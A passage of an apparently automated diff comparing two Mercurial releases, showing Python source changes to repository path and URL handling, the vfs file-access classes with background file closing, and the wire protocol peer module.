+
+    def register_file(self, path):
+        """generic hook point to lets fncache steer its stew"""
+
+
+class vfs(abstractvfs):
+    """Operate files relative to a base directory
+
+    This class is used to hide the details of COW semantics and
+    remote file access from higher level code.
+
+    'cacheaudited' should be enabled only if (a) vfs object is short-lived, or
+    (b) the base directory is managed by hg and considered sort-of append-only.
+    See pathutil.pathauditor() for details.
     """
-    try:
-        # we pass the ui instance are warning might need to be issued
-        return path(ui, None, rawloc=url)
-    except ValueError:
-        return None
-
-
-def get_push_paths(repo, ui, dests):
-    """yields all the `path` selected as push destination by `dests`"""
-    if not dests:
-        if b'default-push' in ui.paths:
-            for p in ui.paths[b'default-push']:
-                yield p.get_push_variant()
-        elif b'default' in ui.paths:
-            for p in ui.paths[b'default']:
-                yield p.get_push_variant()
-        else:
-            raise error.ConfigError(
-                _(b'default repository not configured!'),
-                hint=_(b"see 'hg help config.paths'"),
-            )
-    else:
-        for dest in dests:
-            if dest in ui.paths:
-                for p in ui.paths[dest]:
-                    yield p.get_push_variant()
-            else:
-                path = try_path(ui, dest)
-                if path is None:
-                    msg = _(b'repository %s does not exist')
-                    msg %= dest
-                    raise error.RepoError(msg)
-                yield path.get_push_variant()
-
-
-def get_pull_paths(repo, ui, sources):
-    """yields all the `(path, branch)` selected as pull source by `sources`"""
-    if not sources:
-        sources = [b'default']
-    for source in sources:
-        if source in ui.paths:
-            for p in ui.paths[source]:
-                yield p
+
+    def __init__(
+        self,
+        base: bytes,
+        audit=True,
+        cacheaudited=False,
+        expandpath=False,
+        realpath=False,
+    ):
+        if expandpath:
+            base = util.expandpath(base)
+        if realpath:
+            base = os.path.realpath(base)
+        self.base = base
+        self._audit = audit
+        if audit:
+            self.audit = pathutil.pathauditor(self.base, cached=cacheaudited)
         else:
-            p = path(ui, None, source, validate_path=False)
-            yield p
+            self.audit = lambda path, mode=None: True
+        self.createmode = None
+        self._trustnlink = None
+        self.options = {}
+
+    @util.propertycache
+    def _cansymlink(self) -> bool:
+        return util.checklink(self.base)
+
+    @util.propertycache
+    def _chmod(self):
+        return util.checkexec(self.base)
 
+    def _fixfilemode(self, name):
+        if self.createmode is None or not self._chmod:
+            return
+        os.chmod(name, self.createmode & 0o666)
 
-def get_unique_push_path(action, repo, ui, dest=None):
-    """return a unique `path` or abort if multiple are found
+    def _auditpath(self, path, mode) -> None:
+        if self._audit:
+            if os.path.isabs(path) and path.startswith(self.base):
+                path = os.path.relpath(path, self.base)
+            r = util.checkosfilename(path)
+            if r:
+                raise error.Abort(b"%s: %r" % (r, path))
+            self.audit(path, mode=mode)
+
+    def isfileorlink_checkdir(
+        self, dircache, path: Optional[bytes] = None
+    ) -> bool:
+        """return True if the path is a regular file or a symlink and
+        the directories along the path are "normal", that is
+        not symlinks or nested hg repositories.
 
-    This is useful for command and action that does not support multiple
-    destination (yet).
+        Ignores the `_audit` setting, and checks the directories regardless.
+        `dircache` is used to cache the directory checks.
+        """
+        try:
+            for prefix in pathutil.finddirs_rev_noroot(util.localpath(path)):
+                if prefix in dircache:
+                    res = dircache[prefix]
+                else:
+                    res = pathutil.pathauditor._checkfs_exists(
+                        self.base, prefix, path
+                    )
+                    dircache[prefix] = res
+                if not res:
+                    return False
+        except (OSError, error.Abort):
+            return False
+        return self.isfileorlink(path)
 
-    The `action` parameter will be used for the error message.
-    """
-    if dest is None:
-        dests = []
-    else:
-        dests = [dest]
-    dests = list(get_push_paths(repo, ui, dests))
-    if len(dests) != 1:
-        if dest is None:
-            msg = _(
-                b"default path points to %d urls while %s only supports one"
+    def __call__(
+        self,
+        path: bytes,
+        mode: bytes = b"rb",
+        atomictemp=False,
+        notindexed=False,
+        backgroundclose=False,
+        checkambig=False,
+        auditpath=True,
+        makeparentdirs=True,
+    ):
+        """Open ``path`` file, which is relative to vfs root.
+
+        By default, parent directories are created as needed. Newly created
+        directories are marked as "not to be indexed by the content indexing
+        service", if ``notindexed`` is specified for "write" mode access.
+        Set ``makeparentdirs=False`` to not create directories implicitly.
+
+        If ``backgroundclose`` is passed, the file may be closed asynchronously.
+        It can only be used if the ``self.backgroundclosing()`` context manager
+        is active. This should only be specified if the following criteria hold:
+
+        1. There is a potential for writing thousands of files. Unless you
+           are writing thousands of files, the performance benefits of
+           asynchronously closing files is not realized.
+        2. Files are opened exactly once for the ``backgroundclosing``
+           active duration and are therefore free of race conditions between
+           closing a file on a background thread and reopening it. (If the
+           file were opened multiple times, there could be unflushed data
+           because the original file handle hasn't been flushed/closed yet.)
+
+        ``checkambig`` argument is passed to atomictempfile (valid
+        only for writing), and is useful only if target file is
+        guarded by any lock (e.g. repo.lock or repo.wlock).
+
+        To avoid file stat ambiguity forcibly, checkambig=True involves
+        copying ``path`` file opened in "append" mode (e.g. for
+        truncation), if it is owned by another. Therefore, use
+        combination of append mode and checkambig=True only in limited
+        cases (see also issue5418 and issue5584 for detail).
+        """
+        if auditpath:
+            self._auditpath(path, mode)
+        f = self.join(path)
+
+        if b"b" not in mode:
+            mode += b"b"  # for that other OS
+
+        nlink = -1
+        if mode not in (b'r', b'rb'):
+            dirname, basename = util.split(f)
+            # If basename is empty, then the path is malformed because it points
+            # to a directory. Let the posixfile() call below raise IOError.
+            if basename:
+                if atomictemp:
+                    if makeparentdirs:
+                        util.makedirs(dirname, self.createmode, notindexed)
+                    return util.atomictempfile(
+                        f, mode, self.createmode, checkambig=checkambig
+                    )
+                try:
+                    if b'w' in mode:
+                        util.unlink(f)
+                        nlink = 0
+                    else:
+                        # nlinks() may behave differently for files on Windows
+                        # shares if the file is open.
+                        with util.posixfile(f):
+                            nlink = util.nlinks(f)
+                            if nlink < 1:
+                                nlink = 2  # force mktempcopy (issue1922)
+                except FileNotFoundError:
+                    nlink = 0
+                    if makeparentdirs:
+                        util.makedirs(dirname, self.createmode, notindexed)
+                if nlink > 0:
+                    if self._trustnlink is None:
+                        self._trustnlink = nlink > 1 or util.checknlink(f)
+                    if nlink > 1 or not self._trustnlink:
+                        util.rename(util.mktempcopy(f), f)
+        fp = util.posixfile(f, mode)
+        if nlink == 0:
+            self._fixfilemode(f)
+
+        if checkambig:
+            if mode in (b'r', b'rb'):
+                raise error.Abort(
+                    _(
+                        b'implementation error: mode %s is not'
+                        b' valid for checkambig=True'
+                    )
+                    % mode
+                )
+            fp = checkambigatclosing(fp)
+
+        if backgroundclose and isinstance(
+            threading.current_thread(),
+            threading._MainThread,  # pytype: disable=module-attr
+        ):
+            if (
+                not self._backgroundfilecloser  # pytype: disable=attribute-error
+            ):
+                raise error.Abort(
+                    _(
+                        b'backgroundclose can only be used when a '
+                        b'backgroundclosing context manager is active'
+                    )
+                )
+
+            fp = delayclosedfile(
+                fp,
+                self._backgroundfilecloser,  # pytype: disable=attribute-error
             )
-            msg %= (len(dests), action)
+
+        return fp
+
+    def symlink(self, src: bytes, dst: bytes) -> None:
+        self.audit(dst)
+        linkname = self.join(dst)
+        util.tryunlink(linkname)
+
+        util.makedirs(os.path.dirname(linkname), self.createmode)
+
+        if self._cansymlink:
+            try:
+                os.symlink(src, linkname)
+            except OSError as err:
+                raise OSError(
+                    err.errno,
+                    _(b'could not symlink to %r: %s')
+                    % (src, encoding.strtolocal(err.strerror)),
+                    linkname,
+                )
         else:
-            msg = _(b"path points to %d urls while %s only supports one: %s")
-            msg %= (len(dests), action, dest)
-        raise error.Abort(msg)
-    return dests[0]
+            self.write(dst, src)
 
+    def join(self, path: Optional[bytes], *insidef: bytes) -> bytes:
+        if path:
+            parts = [self.base, path]
+            parts.extend(insidef)
+            return self._join(*parts)
+        else:
+            return self.base
 
-def get_unique_pull_path_obj(action, ui, source=None):
-    """return a unique `(path, branch)` or abort if multiple are found
 
-    This is useful for command and action that does not support multiple
-    destination (yet).
+opener = vfs
 
-    The `action` parameter will be used for the error message.
 
-    note: Ideally, this function would be called `get_unique_pull_path` to
-    mirror the `get_unique_push_path`, but the name was already taken.
-    """
-    sources = []
-    if source is not None:
-        sources.append(source)
-
-    pull_paths = list(get_pull_paths(None, ui, sources=sources))
-    path_count = len(pull_paths)
-    if path_count != 1:
-        if source is None:
-            msg = _(
-                b"default path points to %d urls while %s only supports one"
-            )
-            msg %= (path_count, action)
+class proxyvfs(abstractvfs):
+    def __init__(self, vfs: "vfs"):
+        self.vfs = vfs
+
+    def _auditpath(self, path, mode):
+        return self.vfs._auditpath(path, mode)
+
+    @property
+    def options(self):
+        return self.vfs.options
+
+    @options.setter
+    def options(self, value):
+        self.vfs.options = value
+
+
+class filtervfs(proxyvfs, abstractvfs):
+    '''Wrapper vfs for filtering filenames with a function.'''
+
+    def __init__(self, vfs: "vfs", filter):
+        proxyvfs.__init__(self, vfs)
+        self._filter = filter
+
+    def __call__(self, path: bytes, *args, **kwargs):
+        return self.vfs(self._filter(path), *args, **kwargs)
+
+    def join(self, path: Optional[bytes], *insidef: bytes) -> bytes:
+        if path:
+            return self.vfs.join(self._filter(self.vfs.reljoin(path, *insidef)))
         else:
-            msg = _(b"path points to %d urls while %s only supports one: %s")
-            msg %= (path_count, action, source)
-        raise error.Abort(msg)
-    return pull_paths[0]
+            return self.vfs.join(path)
 
 
-def get_unique_pull_path(action, repo, ui, source=None, default_branches=()):
-    """return a unique `(url, branch)` or abort if multiple are found
+filteropener = filtervfs
 
-    See `get_unique_pull_path_obj` for details.
-    """
-    path = get_unique_pull_path_obj(action, ui, source=source)
-    return parseurl(path.rawloc, default_branches)
 
+class readonlyvfs(proxyvfs):
+    '''Wrapper vfs preventing any writing.'''
 
-def get_clone_path_obj(ui, source):
-    """return the `(origsource, url, branch)` selected as clone source"""
-    if source == b'':
-        return None
-    return get_unique_pull_path_obj(b'clone', ui, source=source)
-
-
-def get_clone_path(ui, source, default_branches=None):
-    """return the `(origsource, url, branch)` selected as clone source"""
-    path = get_clone_path_obj(ui, source)
-    if path is None:
-        return (b'', b'', (None, default_branches))
-    if default_branches is None:
-        default_branches = []
-    branches = (path.branch, default_branches)
-    return path.rawloc, path.loc, branches
-
-
-def parseurl(path, branches=None):
-    '''parse url#branch, returning (url, (branch, branches))'''
-    u = url(path)
-    branch = None
-    if u.fragment:
-        branch = u.fragment
-        u.fragment = None
-    return bytes(u), (branch, branches or [])
+    def __init__(self, vfs: "vfs"):
+        proxyvfs.__init__(self, vfs)
 
+    def __call__(self, path: bytes, mode: bytes = b'rb', *args, **kw):
+        if mode not in (b'r', b'rb'):
+            raise error.Abort(_(b'this vfs is read only'))
+        return self.vfs(path, mode, *args, **kw)
 
-class paths(dict):
-    """Represents a collection of paths and their configs.
+    def join(self, path: Optional[bytes], *insidef: bytes) -> bytes:
+        return self.vfs.join(path, *insidef)
 
-    Data is initially derived from ui instances and the config files they have
-    loaded.
+
+class closewrapbase:
+    """Base class of wrapper, which hooks closing
+
+    Do not instantiate outside of the vfs layer.
     """
 
-    def __init__(self, ui):
-        dict.__init__(self)
+    def __init__(self, fh):
+        object.__setattr__(self, '_origfh', fh)
 
-        home_path = os.path.expanduser(b'~')
+    def __getattr__(self, attr):
+        return getattr(self._origfh, attr)
 
-        for name, value in ui.configitems(b'paths', ignoresub=True):
-            # No location is the same as not existing.
-            if not value:
-                continue
-            _value, sub_opts = ui.configsuboptions(b'paths', name)
-            s = ui.configsource(b'paths', name)
-            root_key = (name, value, s)
-            root = ui._path_to_root.get(root_key, home_path)
-
-            multi_url = sub_opts.get(b'multi-urls')
-            if multi_url is not None and stringutil.parsebool(multi_url):
-                base_locs = stringutil.parselist(value)
-            else:
-                base_locs = [value]
-
-            paths = []
-            for loc in base_locs:
-                loc = os.path.expandvars(loc)
-                loc = os.path.expanduser(loc)
-                if not hasscheme(loc) and not os.path.isabs(loc):
-                    loc = os.path.normpath(os.path.join(root, loc))
-                p = path(ui, name, rawloc=loc, suboptions=sub_opts)
-                paths.append(p)
-            self[name] = paths
-
-        for name, old_paths in sorted(self.items()):
-            new_paths = []
-            for p in old_paths:
-                new_paths.extend(_chain_path(p, ui, self))
-            self[name] = new_paths
-
-
-_pathsuboptions = {}
-# a dictionnary of methods that can be used to format a sub-option value
-path_suboptions_display = {}
-
-
-def pathsuboption(option, attr, display=pycompat.bytestr):
-    """Decorator used to declare a path sub-option.
-
-    Arguments are the sub-option name and the attribute it should set on
-    ``path`` instances.
-
-    The decorated function will receive as arguments a ``ui`` instance,
-    ``path`` instance, and the string value of this option from the config.
-    The function should return the value that will be set on the ``path``
-    instance.
+    def __setattr__(self, attr, value):
+        return setattr(self._origfh, attr, value)
 
-    The optional `display` argument is a function that can be used to format
-    the value when displayed to the user (like in `hg paths` for example).
+    def __delattr__(self, attr):
+        return delattr(self._origfh, attr)
 
-    This decorator can be used to perform additional verification of
-    sub-options and to change the type of sub-options.
-    """
+    def __enter__(self):
+        self._origfh.__enter__()
+        return self
 
-    def register(func):
-        _pathsuboptions[option] = (attr, func)
-        path_suboptions_display[option] = display
-        return func
-
-    return register
-
-
-def display_bool(value):
-    """display a boolean suboption back to the user"""
-    return b'yes' if value else b'no'
-
-
-@pathsuboption(b'pushurl', b'_pushloc')
-def pushurlpathoption(ui, path, value):
-    u = url(value)
-    # Actually require a URL.
-    if not u.scheme:
-        msg = _(b'(paths.%s:pushurl not a URL; ignoring: "%s")\n')
-        msg %= (path.name, value)
-        ui.warn(msg)
-        return None
-
-    # Don't support the #foo syntax in the push URL to declare branch to
-    # push.
-    if u.fragment:
-        ui.warn(
-            _(
-                b'("#fragment" in paths.%s:pushurl not supported; '
-                b'ignoring)\n'
-            )
-            % path.name
-        )
-        u.fragment = None
+    def __exit__(self, exc_type, exc_value, exc_tb):
+        raise NotImplementedError('attempted instantiating ' + str(type(self)))
 
-    return bytes(u)
+    def close(self):
+        raise NotImplementedError('attempted instantiating ' + str(type(self)))
 
 
-@pathsuboption(b'pushrev', b'pushrev')
-def pushrevpathoption(ui, path, value):
-    return value
-
-
-SUPPORTED_BOOKMARKS_MODES = {
-    b'default',
-    b'mirror',
-    b'ignore',
-}
-
-
-@pathsuboption(b'bookmarks.mode', b'bookmarks_mode')
-def bookmarks_mode_option(ui, path, value):
-    if value not in SUPPORTED_BOOKMARKS_MODES:
-        path_name = path.name
-        if path_name is None:
-            # this is an "anonymous" path, config comes from the global one
-            path_name = b'*'
-        msg = _(b'(paths.%s:bookmarks.mode has unknown value: "%s")\n')
-        msg %= (path_name, value)
-        ui.warn(msg)
-    if value == b'default':
-        value = None
-    return value
-
-
-DELTA_REUSE_POLICIES = {
-    b'default': None,
-    b'try-base': revlog_constants.DELTA_BASE_REUSE_TRY,
-    b'no-reuse': revlog_constants.DELTA_BASE_REUSE_NO,
-    b'forced': revlog_constants.DELTA_BASE_REUSE_FORCE,
-}
-DELTA_REUSE_POLICIES_NAME = dict(i[::-1] for i in DELTA_REUSE_POLICIES.items())
-
-
-@pathsuboption(
-    b'pulled-delta-reuse-policy',
-    b'delta_reuse_policy',
-    display=DELTA_REUSE_POLICIES_NAME.get,
-)
-def delta_reuse_policy(ui, path, value):
-    if value not in DELTA_REUSE_POLICIES:
-        path_name = path.name
-        if path_name is None:
-            # this is an "anonymous" path, config comes from the global one
-            path_name = b'*'
-        msg = _(
-            b'(paths.%s:pulled-delta-reuse-policy has unknown value: "%s")\n'
-        )
-        msg %= (path_name, value)
-        ui.warn(msg)
-    return DELTA_REUSE_POLICIES.get(value)
+class delayclosedfile(closewrapbase):
+    """Proxy for a file object whose close is delayed.
 
+    Do not instantiate outside of the vfs layer.
+    """
 
-@pathsuboption(b'multi-urls', b'multi_urls', display=display_bool)
-def multiurls_pathoption(ui, path, value):
-    res = stringutil.parsebool(value)
-    if res is None:
-        ui.warn(
-            _(b'(paths.%s:multi-urls not a boolean; ignoring)\n') % path.name
-        )
-        res = False
-    return res
+    def __init__(self, fh, closer):
+        super(delayclosedfile, self).__init__(fh)
+        object.__setattr__(self, '_closer', closer)
 
+    def __exit__(self, exc_type, exc_value, exc_tb):
+        self._closer.close(self._origfh)
 
-def _chain_path(base_path, ui, paths):
-    """return the result of "path://" logic applied on a given path"""
-    new_paths = []
-    if base_path.url.scheme != b'path':
-        new_paths.append(base_path)
-    else:
-        assert base_path.url.path is None
-        sub_paths = paths.get(base_path.url.host)
-        if sub_paths is None:
-            m = _(b'cannot use `%s`, "%s" is not a known path')
-            m %= (base_path.rawloc, base_path.url.host)
-            raise error.Abort(m)
-        for subpath in sub_paths:
-            path = base_path.copy()
-            if subpath.raw_url.scheme == b'path':
-                m = _(b'cannot use `%s`, "%s" is also defined as a `path://`')
-                m %= (path.rawloc, path.url.host)
-                raise error.Abort(m)
-            path.url = subpath.url
-            path.rawloc = subpath.rawloc
-            path.loc = subpath.loc
-            if path.branch is None:
-                path.branch = subpath.branch
-            else:
-                base = path.rawloc.rsplit(b'#', 1)[0]
-                path.rawloc = b'%s#%s' % (base, path.branch)
-            suboptions = subpath._all_sub_opts.copy()
-            suboptions.update(path._own_sub_opts)
-            path._apply_suboptions(ui, suboptions)
-            new_paths.append(path)
-    return new_paths
+    def close(self):
+        self._closer.close(self._origfh)
 
 
-class path:
-    """Represents an individual path and its configuration."""
+class backgroundfilecloser:
+    """Coordinates background closing of file handles on multiple threads."""
 
-    def __init__(
-        self,
-        ui=None,
-        name=None,
-        rawloc=None,
-        suboptions=None,
-        validate_path=True,
-    ):
-        """Construct a path from its config options.
+    def __init__(self, ui, expectedcount=-1):
+        self._running = False
+        self._entered = False
+        self._threads = []
+        self._threadexception = None
 
-        ``ui`` is the ``ui`` instance the path is coming from.
-        ``name`` is the symbolic name of the path.
-        ``rawloc`` is the raw location, as defined in the config.
-        ``_pushloc`` is the raw locations pushes should be made to.
-                     (see the `get_push_variant` method)
-
-        If ``name`` is not defined, we require that the location be a) a local
-        filesystem path with a .hg directory or b) a URL. If not,
-        ``ValueError`` is raised.
-        """
-        if ui is None:
-            # used in copy
-            assert name is None
-            assert rawloc is None
-            assert suboptions is None
+        # Only Windows/NTFS has slow file closing. So only enable by default
+        # on that platform. But allow to be enabled elsewhere for testing.
+        defaultenabled = pycompat.iswindows
+        enabled = ui.configbool(b'worker', b'backgroundclose', defaultenabled)
+
+        if not enabled:
             return
 
-        if not rawloc:
-            raise ValueError(b'rawloc must be defined')
+        # There is overhead to starting and stopping the background threads.
+        # Don't do background processing unless the file count is large enough
+        # to justify it.
+        minfilecount = ui.configint(b'worker', b'backgroundcloseminfilecount')
+        # FUTURE dynamically start background threads after minfilecount closes.
+        # (We don't currently have any callers that don't know their file count)
+        if expectedcount > 0 and expectedcount < minfilecount:
+            return
 
-        self.name = name
+        maxqueue = ui.configint(b'worker', b'backgroundclosemaxqueue')
+        threadcount = ui.configint(b'worker', b'backgroundclosethreadcount')
 
-        # set by path variant to point to their "non-push" version
-        self.main_path = None
-        self._setup_url(rawloc)
-
-        if validate_path:
-            self._validate_path()
-
-        _path, sub_opts = ui.configsuboptions(b'paths', b'*')
-        self._own_sub_opts = {}
-        if suboptions is not None:
-            self._own_sub_opts = suboptions.copy()
-            sub_opts.update(suboptions)
-        self._all_sub_opts = sub_opts.copy()
-
-        self._apply_suboptions(ui, sub_opts)
-
-    def _setup_url(self, rawloc):
-        # Locations may define branches via syntax <base>#<branch>.
-        u = url(rawloc)
-        branch = None
-        if u.fragment:
-            branch = u.fragment
-            u.fragment = None
-
-        self.url = u
-        # the url from the config/command line before dealing with `path://`
-        self.raw_url = u.copy()
-        self.branch = branch
+        ui.debug(
+            b'starting %d threads for background file closing\n' % threadcount
+        )
 
-        self.rawloc = rawloc
-        self.loc = b'%s' % u
+        self._queue = pycompat.queue.Queue(maxsize=maxqueue)
+        self._running = True
 
-    def copy(self, new_raw_location=None):
-        """make a copy of this path object
+        for i in range(threadcount):
+            t = threading.Thread(target=self._worker, name='backgroundcloser')
+            self._threads.append(t)
+            t.start()
+
+    def __enter__(self):
+        self._entered = True
+        return self
+
+    def __exit__(self, exc_type, exc_value, exc_tb):
+        self._running = False
+
+        # Wait for threads to finish closing so open files don't linger for
+        # longer than lifetime of context manager.
+        for t in self._threads:
+            t.join()
+
+    def _worker(self):
+        """Main routine for worker thread."""
+        while True:
+            try:
+                fh = self._queue.get(block=True, timeout=0.100)
+                # Need to catch or the thread will terminate and
+                # we could orphan file descriptors.
+                try:
+                    fh.close()
+                except Exception as e:
+                    # Stash so can re-raise from main thread later.
+                    self._threadexception = e
+            except pycompat.queue.Empty:
+                if not self._running:
+                    break
+
+    def close(self, fh):
+        """Schedule a file for closing."""
+        if not self._entered:
+            raise error.Abort(
+                _(b'can only call close() when context manager active')
+            )
 
-        When `new_raw_location` is set, the new path will point to it.
-        This is used by the scheme extension so expand the scheme.
-        """
-        new = self.__class__()
-        for k, v in self.__dict__.items():
-            new_copy = getattr(v, 'copy', None)
-            if new_copy is not None:
-                v = new_copy()
-            new.__dict__[k] = v
-        if new_raw_location is not None:
-            new._setup_url(new_raw_location)
-        return new
+        # If a background thread encountered an exception, raise now so we fail
+        # fast. Otherwise we may potentially go on for minutes until the error
+        # is acted on.
+        if self._threadexception:
+            e = self._threadexception
+            self._threadexception = None
+            raise e
+
+        # If we're not actively running, close synchronously.
+        if not self._running:
+            fh.close()
+            return
 
-    @property
-    def is_push_variant(self):
-        """is this a path variant to be used for pushing"""
-        return self.main_path is not None
+        self._queue.put(fh, block=True, timeout=None)
 
-    def get_push_variant(self):
-        """get a "copy" of the path, but suitable for pushing
 
-        This means using the value of the `pushurl` option (if any) as the url.
+class checkambigatclosing(closewrapbase):
+    """Proxy for a file object, to avoid ambiguity of file stat
 
-        The original path is available in the `main_path` attribute.
-        """
-        if self.main_path:
-            return self
-        new = self.copy()
-        new.main_path = self
-        if self._pushloc:
-            new._setup_url(self._pushloc)
-        return new
-
-    def pushloc(self):
-        """compatibility layer for the deprecated attributes"""
-        from .. import util  # avoid a cycle
-
-        msg = "don't use path.pushloc, use path.get_push_variant()"
-        util.nouideprecwarn(msg, b"6.5")
-        return self._pushloc
-
-    def _validate_path(self):
-        # When given a raw location but not a symbolic name, validate the
-        # location is valid.
-        if (
-            not self.name
-            and not self.url.scheme
-            and not self._isvalidlocalpath(self.loc)
-        ):
-            raise ValueError(
-                b'location is not a URL or path to a local '
-                b'repo: %s' % self.rawloc
-            )
+    See also util.filestat for detail about "ambiguity of file stat".
 
-    def _apply_suboptions(self, ui, sub_options):
-        # Now process the sub-options. If a sub-option is registered, its
-        # attribute will always be present. The value will be None if there
-        # was no valid sub-option.
-        for suboption, (attr, func) in _pathsuboptions.items():
-            if suboption not in sub_options:
-                setattr(self, attr, None)
-                continue
-
-            value = func(ui, self, sub_options[suboption])
-            setattr(self, attr, value)
-
-    def _isvalidlocalpath(self, path):
-        """Returns True if the given path is a potentially valid repository.
-        This is its own function so that extensions can change the definition of
-        'valid' in this case (like when pulling from a git repo into a hg
-        one)."""
-        try:
-            return os.path.isdir(os.path.join(path, b'.hg'))
-        # Python 2 may return TypeError. Python 3, ValueError.
-        except (TypeError, ValueError):
-            return False
+    This proxy is useful only if the target file is guarded by any
+    lock (e.g. repo.lock or repo.wlock)
 
-    @property
-    def suboptions(self):
-        """Return sub-options and their values for this path.
+    Do not instantiate outside of the vfs layer.
+    """
 
-        This is intended to be used for presentation purposes.
-        """
-        d = {}
-        for subopt, (attr, _func) in _pathsuboptions.items():
-            value = getattr(self, attr)
-            if value is not None:
-                d[subopt] = value
-        return d
+    def __init__(self, fh):
+        super(checkambigatclosing, self).__init__(fh)
+        object.__setattr__(self, '_oldstat', util.filestat.frompath(fh.name))
+
+    def _checkambig(self):
+        oldstat = self._oldstat
+        if oldstat.stat:
+            _avoidambig(self._origfh.name, oldstat)
+
+    def __exit__(self, exc_type, exc_value, exc_tb):
+        self._origfh.__exit__(exc_type, exc_value, exc_tb)
+        self._checkambig()
+
+    def close(self):
+        self._origfh.close()
+        self._checkambig()
```

### Comparing `mercurial-6.4.5/mercurial/verify.py` & `mercurial-6.4rc0/mercurial/verify.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/vfs.py` & `mercurial-6.4rc0/mercurial/wireprotov1peer.py`

 * *Files 27% similar despite different names*

```diff
@@ -1,817 +1,648 @@
-# vfs.py - Mercurial 'vfs' classes
+# wireprotov1peer.py - Client-side functionality for wire protocol version 1.
 #
-#  Copyright Olivia Mackall <olivia@selenic.com>
+# Copyright 2005-2010 Olivia Mackall <olivia@selenic.com>
 #
 # This software may be used and distributed according to the terms of the
 # GNU General Public License version 2 or any later version.
 
-import contextlib
-import os
-import shutil
-import stat
-import threading
 
-from typing import (
-    Optional,
-)
+import sys
+import weakref
 
+from concurrent import futures
 from .i18n import _
+from .node import bin
 from .pycompat import (
-    delattr,
     getattr,
     setattr,
 )
 from . import (
+    bundle2,
+    changegroup as changegroupmod,
     encoding,
     error,
-    pathutil,
+    pushkey as pushkeymod,
     pycompat,
     util,
+    wireprototypes,
 )
+from .interfaces import (
+    repository,
+    util as interfaceutil,
+)
+from .utils import hashutil
 
+urlreq = util.urlreq
 
-def _avoidambig(path: bytes, oldstat):
-    """Avoid file stat ambiguity forcibly
-
-    This function causes copying ``path`` file, if it is owned by
-    another (see issue5418 and issue5584 for detail).
-    """
-
-    def checkandavoid():
-        newstat = util.filestat.frompath(path)
-        # return whether file stat ambiguity is (already) avoided
-        return not newstat.isambig(oldstat) or newstat.avoidambig(path, oldstat)
-
-    if not checkandavoid():
-        # simply copy to change owner of path to get privilege to
-        # advance mtime (see issue5418)
-        util.rename(util.mktempcopy(path), path)
-        checkandavoid()
-
-
-class abstractvfs:
-    """Abstract base class; cannot be instantiated"""
-
-    # default directory separator for vfs
-    #
-    # Other vfs code always use `/` and this works fine because python file API
-    # abstract the use of `/` and make it work transparently. For consistency
-    # vfs will always use `/` when joining. This avoid some confusion in
-    # encoded vfs (see issue6546)
-    _dir_sep = b'/'
-
-    def __init__(self, *args, **kwargs):
-        '''Prevent instantiation; don't call this from subclasses.'''
-        raise NotImplementedError('attempted instantiating ' + str(type(self)))
-
-    # TODO: type return, which is util.posixfile wrapped by a proxy
-    def __call__(self, path: bytes, mode: bytes = b'rb', **kwargs):
-        raise NotImplementedError
-
-    def _auditpath(self, path: bytes, mode: bytes):
-        raise NotImplementedError
 
-    def join(self, path: Optional[bytes], *insidef: bytes) -> bytes:
-        raise NotImplementedError
+def batchable(f):
+    """annotation for batchable methods
 
-    def tryread(self, path: bytes) -> bytes:
-        '''gracefully return an empty string for missing files'''
-        try:
-            return self.read(path)
-        except FileNotFoundError:
-            pass
-        return b""
+    Such methods must implement a coroutine as follows:
 
-    def tryreadlines(self, path: bytes, mode: bytes = b'rb'):
-        '''gracefully return an empty array for missing files'''
-        try:
-            return self.readlines(path, mode=mode)
-        except FileNotFoundError:
-            pass
-        return []
-
-    @util.propertycache
-    def open(self):
-        """Open ``path`` file, which is relative to vfs root.
-
-        Newly created directories are marked as "not to be indexed by
-        the content indexing service", if ``notindexed`` is specified
-        for "write" mode access.
-        """
-        return self.__call__
+    @batchable
+    def sample(self, one, two=None):
+        # Build list of encoded arguments suitable for your wire protocol:
+        encoded_args = [('one', encode(one),), ('two', encode(two),)]
+        # Return it, along with a function that will receive the result
+        # from the batched request.
+        return encoded_args, decode
 
-    def read(self, path: bytes) -> bytes:
-        with self(path, b'rb') as fp:
-            return fp.read()
-
-    def readlines(self, path: bytes, mode: bytes = b'rb'):
-        with self(path, mode=mode) as fp:
-            return fp.readlines()
-
-    def write(
-        self, path: bytes, data: bytes, backgroundclose=False, **kwargs
-    ) -> int:
-        with self(path, b'wb', backgroundclose=backgroundclose, **kwargs) as fp:
-            return fp.write(data)
+    The decorator returns a function which wraps this coroutine as a plain
+    method, but adds the original method as an attribute called "batchable",
+    which is used by remotebatch to split the call into separate encoding and
+    decoding phases.
+    """
 
-    def writelines(
-        self, path: bytes, data: bytes, mode: bytes = b'wb', notindexed=False
-    ) -> None:
-        with self(path, mode=mode, notindexed=notindexed) as fp:
-            return fp.writelines(data)
+    def plain(*args, **opts):
+        encoded_args_or_res, decode = f(*args, **opts)
+        if not decode:
+            return encoded_args_or_res  # a local result in this case
+        self = args[0]
+        cmd = pycompat.bytesurl(f.__name__)  # ensure cmd is ascii bytestr
+        encoded_res = self._submitone(cmd, encoded_args_or_res)
+        return decode(encoded_res)
+
+    setattr(plain, 'batchable', f)
+    setattr(plain, '__name__', f.__name__)
+    return plain
+
+
+def encodebatchcmds(req):
+    """Return a ``cmds`` argument value for the ``batch`` command."""
+    escapearg = wireprototypes.escapebatcharg
+
+    cmds = []
+    for op, argsdict in req:
+        # Old servers didn't properly unescape argument names. So prevent
+        # the sending of argument names that may not be decoded properly by
+        # servers.
+        assert all(escapearg(k) == k for k in argsdict)
 
-    def append(self, path: bytes, data: bytes) -> int:
-        with self(path, b'ab') as fp:
-            return fp.write(data)
+        args = b','.join(
+            b'%s=%s' % (escapearg(k), escapearg(v)) for k, v in argsdict.items()
+        )
+        cmds.append(b'%s %s' % (op, args))
 
-    def basename(self, path: bytes) -> bytes:
-        """return base element of a path (as os.path.basename would do)
+    return b';'.join(cmds)
 
-        This exists to allow handling of strange encoding if needed."""
-        return os.path.basename(path)
 
-    def chmod(self, path: bytes, mode: int) -> None:
-        return os.chmod(self.join(path), mode)
+class unsentfuture(futures.Future):
+    """A Future variation to represent an unsent command.
 
-    def dirname(self, path: bytes) -> bytes:
-        """return dirname element of a path (as os.path.dirname would do)
+    Because we buffer commands and don't submit them immediately, calling
+    ``result()`` on an unsent future could deadlock. Futures for buffered
+    commands are represented by this type, which wraps ``result()`` to
+    call ``sendcommands()``.
+    """
 
-        This exists to allow handling of strange encoding if needed."""
-        return os.path.dirname(path)
+    def result(self, timeout=None):
+        if self.done():
+            return futures.Future.result(self, timeout)
+
+        self._peerexecutor.sendcommands()
+
